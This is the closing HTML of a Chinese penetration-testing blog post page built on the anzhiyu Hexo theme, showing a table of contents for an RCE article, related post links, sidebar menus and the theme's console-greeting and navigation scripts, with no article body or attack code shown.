"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-08-05</div><div class="title">SQL注入-WAF绕过</div></div></a></div><div><a href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/10.%20XXE%E6%BC%8F%E6%B4%9E" title="XXE"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-08-05</div><div class="title">XXE</div></div></a></div><div><a href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%20%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E" title="逻辑漏洞"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-08-05</div><div class="title">逻辑漏洞</div></div></a></div><div><a href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/11.%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" title="反序列化漏洞"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2022-08-05</div><div class="title">反序列化漏洞</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__description"></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE-%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">RCE 代码及命令执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.</span> <span class="toc-text">代码执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F"><span class="toc-number">1.1.2.</span> <span class="toc-text">产生</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.1.3.</span> <span class="toc-text">危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.4.</span> <span class="toc-text">函数介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#eval"><span class="toc-number">1.1.4.1.</span> <span class="toc-text">eval()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#assert"><span class="toc-number">1.1.4.2.</span> <span class="toc-text">assert()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#preg-replace"><span class="toc-number">1.1.4.3.</span> <span class="toc-text">preg_replace()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#call-user-func"><span class="toc-number">1.1.4.4.</span> <span class="toc-text">call_user_func()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#call-user-func-array"><span class="toc-number">1.1.4.5.</span> <span class="toc-text">call_user_func_array()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#array-map"><span class="toc-number">1.1.4.6.</span> <span class="toc-text">array_ map()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.5.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">1.1.6.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text">命令执行漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A7%E7%94%9F-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">产生</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">函数介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#system"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">system()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#exec"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">exec()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#passthru"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">passthru()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#shell-exec"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">shell_exec()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#popen"><span class="toc-number">1.2.3.5.</span> <span class="toc-text">popen()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#proc-open"><span class="toc-number">1.2.3.6.</span> <span class="toc-text">proc_open()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#pcntl-exec"><span class="toc-number">1.2.3.7.</span> <span class="toc-text">pcntl_exec()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#echo"><span class="toc-number">1.2.3.8.</span> <span class="toc-text">echo()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1-1"><span class="toc-number">1.2.4.</span> <span class="toc-text">防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.5.</span> <span class="toc-text">绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%96%E6%8E%98"><span class="toc-number">1.3.</span> <span class="toc-text">挖掘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B"><span class="toc-number">1.4.</span> <span class="toc-text">案例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A2%A8%E8%80%85%E9%9D%B6%E5%9C%BA%E9%BB%91%E7%9B%92%E5%B1%82-RCE-%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B-%E5%85%AC%E5%BC%80%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.1.</span> <span class="toc-text">墨者靶场黑盒层 RCE 漏洞检测-公开漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Javaweb-Struts2-%E6%A1%86%E6%9E%B6%E7%B1%BB-RCE-%E6%BC%8F%E6%B4%9E-%E6%BC%8F%E6%B4%9E%E5%B1%82%E9%9D%A2"><span class="toc-number">1.4.2.</span> <span class="toc-text">Javaweb-Struts2 框架类 RCE 漏洞-漏洞层面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D-Webshell-%E5%90%8E%E9%97%A8%E5%8E%9F%E7%90%86%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E6%8B%93%E5%B1%95%E8%AF%B4%E6%98%8E"><span class="toc-number">1.4.3.</span> <span class="toc-text">一句话 Webshell 后门原理代码执行-拓展说明</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/hello-world" title="Hello World">Hello World</a><time datetime="2023-10-05T11:40:46.695Z" title="Created 2023-10-05 19:40:46">2023-10-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/0.%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A8%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93" title="渗透测试全流程">渗透测试全流程</a><time datetime="2022-08-04T16:00:00.000Z" title="Created 2022-08-05 00:00:00">2022-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1.%20%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E4%B8%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86" title="基础概念与信息收集">基础概念与信息收集</a><time datetime="2022-08-04T16:00:00.000Z" title="Created 2022-08-05 00:00:00">2022-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2.%20SQL%E6%B3%A8%E5%85%A5-WAF%E7%BB%95%E8%BF%87" title="SQL注入-WAF绕过">SQL注入-WAF绕过</a><time datetime="2022-08-04T16:00:00.000Z" title="Created 2022-08-05 00:00:00">2022-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/10.%20XXE%E6%BC%8F%E6%B4%9E" title="XXE">XXE</a><time datetime="2022-08-04T16:00:00.000Z" title="Created 2022-08-05 00:00:00">2022-08-05</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2023 By <a class="footer-bar-link" href="/" title="ccb" target="_blank">ccb</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">Articles</div><div class="length-num">40</div></a><a href="/tags/" title="tag"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/" title="category"><div class="headline">Categories</div><div class="length-num">0</div></a></div><span class="sidebar-menu-item-title">Function</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="Display Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>Display Mode</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/DVWA%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">DVWA靶场<sup>10</sup></a><a href="/tags/%E5%AE%9E%E8%AE%AD-%E7%BD%91%E7%BB%9C%E5%BB%BA%E8%AE%BE%E9%83%A8%E5%88%86/" style="font-size: 0.88rem;">实训-网络建设部分<sup>7</sup></a><a href="/tags/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/" style="font-size: 0.88rem;">搭建博客<sup>1</sup></a><a href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/" style="font-size: 0.88rem;">机器学习<sup>1</sup></a><a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 0.88rem;">渗透测试<sup>15</sup></a><a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">计算机基础<sup>5</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">繁</button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.4/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2020 By 安知鱼 V1.6.8",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 ccb 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "visitor@anheyu.com";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404')
+  }
+})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
